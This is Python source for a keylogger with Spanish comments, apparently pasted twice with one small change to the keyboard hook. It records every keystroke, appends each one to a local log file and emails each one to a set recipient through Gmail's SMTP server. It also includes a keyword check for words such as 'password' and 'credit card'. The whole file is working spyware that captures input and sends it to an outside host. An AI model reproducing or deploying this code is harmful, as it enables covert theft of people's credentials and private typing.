import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

def send_email(subject, body):
    """
    Envía un correo electrónico con el registro de teclas.
    """
    try:
        sender_email = 'tucorreo@gmail.com'  # Tu dirección de correo electrónico
        receiver_email = 'destinatario@gmail.com'  # La dirección de correo electrónico del destinatario
        password = 'tucontraseña'  # Tu contraseña de correo electrónico

        # Configura el mensaje
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        # Conéctate al servidor SMTP y envía el correo electrónico
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            
    except Exception as e:
        print(f"Error al enviar el correo electrónico: {e}")

def detect_suspicious_activity(key_info):
    """
    Detecta actividad sospechosa en el registro de teclas.
    """
    suspicious_patterns = ['password', 'username', 'credit card', 'login']

    for pattern in suspicious_patterns:
        if pattern in key_info.lower():
            return True

    return False

def keylogger_callback(event):
    """
    Función de devolución de llamada para el keylogger.
    Registra la tecla presionada, envía el registro por correo electrónico y guarda en un archivo de texto.
    También detecta actividad sospechosa y envía una alerta si es necesario.
    """
    try:
        key_name = event.name
        scan_code = event.scan_code
        time_stamp = event.time

        # Construye una cadena con la información de la tecla
        key_info = f"Tecla: {key_name}, Código de escaneo: {scan_code}, Tiempo: {time_stamp}\n"

        # Imprime la información en la consola
        print(key_info, end="")

        # Detecta actividad sospechosa
        if detect_suspicious_activity(key_info):
            print("¡Alerta! Actividad sospechosa detectada.")

        # Envía el registro por correo electrónico
        subject = 'Registro de Teclas'
        body = key_info
        send_email(subject, body)

        # Guarda la información en un archivo de texto
        with open("keylog.txt", "a", encoding="utf-8") as file:
            file.write(key_info)
            
    except Exception as e:
        print(f"Error en la captura de teclas: {e}")

def main():
    print("Iniciando Keylogger. Presiona cualquier tecla para comenzar a registrar...")

    # Instala el gancho del keylogger
    keyboard.hook(keylogger_callback)

    try:
        # Espera indefinidamente hasta que se presione una tecla para terminar el programa
        keyboard.wait()
    except KeyboardInterrupt:
        # Maneja la interrupción del teclado (Ctrl+C) para salir graciosamente
        print("\nKeylogger detenido. Saliendo...")

if __name__ == "__main__":
    main()
import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

def send_email(subject, body):
    """
    Envía un correo electrónico con el registro de teclas.
    """
    try:
        sender_email = 'tucorreo@gmail.com'  # Tu dirección de correo electrónico
        receiver_email = 'destinatario@gmail.com'  # La dirección de correo electrónico del destinatario
        password = 'tucontraseña'  # Tu contraseña de correo electrónico

        # Configura el mensaje
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        # Conéctate al servidor SMTP y envía el correo electrónico
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            
    except Exception as e:
        print(f"Error al enviar el correo electrónico: {e}")

def detect_suspicious_activity(key_info):
    """
    Detecta actividad sospechosa en el registro de teclas.
    """
    suspicious_patterns = ['password', 'username', 'credit card', 'login']

    for pattern in suspicious_patterns:
        if pattern in key_info.lower():
            return True

    return False

def keylogger_callback(event):
    """
    Función de devolución de llamada para el keylogger.
    Registra la tecla presionada, envía el registro por correo electrónico y guarda en un archivo de texto.
    También detecta actividad sospechosa y envía una alerta si es necesario.
    """
    try:
        key_name = event.name
        scan_code = event.scan_code
        time_stamp = event.time

        # Construye una cadena con la información de la tecla
        key_info = f"Tecla: {key_name}, Código de escaneo: {scan_code}, Tiempo: {time_stamp}\n"

        # Imprime la información en la consola
        print(key_info, end="")

        # Detecta actividad sospechosa
        if detect_suspicious_activity(key_info):
            print("¡Alerta! Actividad sospechosa detectada.")

        # Envía el registro por correo electrónico
        subject = 'Registro de Teclas'
        body = key_info
        send_email(subject, body)

        # Guarda la información en un archivo de texto
        with open("keylog.txt", "a", encoding="utf-8") as file:
            file.write(key_info)
            
    except Exception as e:
        print(f"Error en la captura de teclas: {e}")

def main():
    print("Iniciando Keylogger. Presiona cualquier tecla para comenzar a registrar...")

    # Instala el gancho del keylogger
    keyboard.on_press(keylogger_callback)

    try:
        # Espera indefinidamente hasta que se presione una tecla para terminar el programa
        keyboard.wait()
    except KeyboardInterrupt:
        # Maneja la interrupción del teclado (Ctrl+C) para salir graciosamente
        print("\nKeylogger detenido. Saliendo...")

if __name__ == "__main__":
    main()

